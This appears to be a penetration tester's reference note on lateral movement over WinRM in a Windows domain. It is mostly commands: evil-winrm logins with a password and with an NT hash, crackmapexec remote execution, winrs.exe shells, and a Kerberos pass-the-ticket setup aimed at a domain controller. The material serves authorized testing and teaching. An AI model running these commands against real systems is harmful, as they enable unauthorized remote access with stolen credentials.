---
title: WinRM Lateral Movement
---

[[notes/lateral-movement/index]] over [[notes/network/winrm]].

Establish a connection.

=== "[[notes/tools/evil-winrm]]"
    ~~~ bash
    evil-winrm -u jdoe -p 'passw0rd' -i srv01.corp.local
    evil-winrm -u jdoe -H $nthash -i srv01.corp.local
    ~~~

=== "[[notes/tools/crackmapexec]]"
    ~~~ bash
    crackmapexec winrm srv01.corp.local -u jdoe -p 'passw0rd' -x 'whoami /all'
    ~~~

=== "builtin"
    ~~~ bat
    winrs.exe -r:srv01.corp.local cmd
    winrs.exe -r:srv01.corp.local "cmd /c hostname && whoami"
    ~~~

[[notes/ad/pass-the-ticket]] to WinRM.

=== "[[notes/tools/evil-winrm]]"
    ~~~ bash
    export KRB5CCNAME=$PWD/jdoeadm.ccache
    cat << EOF | sudo tee /etc/krb5.conf > /dev/null
    [realms]
        corp.local = {
            kdc = DC01.corp.local
            admin_server = corp.local
        }
    EOF
    evil-winrm -r corp.local -i DC01.corp.local
    ~~~

> **Note:** In one instance `evil-winrm` could not use the TGT from `ceritpy auth`, but the TGT from `pkinittools-gettgtpkinit` worked.

Untested tools:

- [awinrm](https://github.com/skelsec/awinrm)
- [pywinrm](https://github.com/diyan/pywinrm)
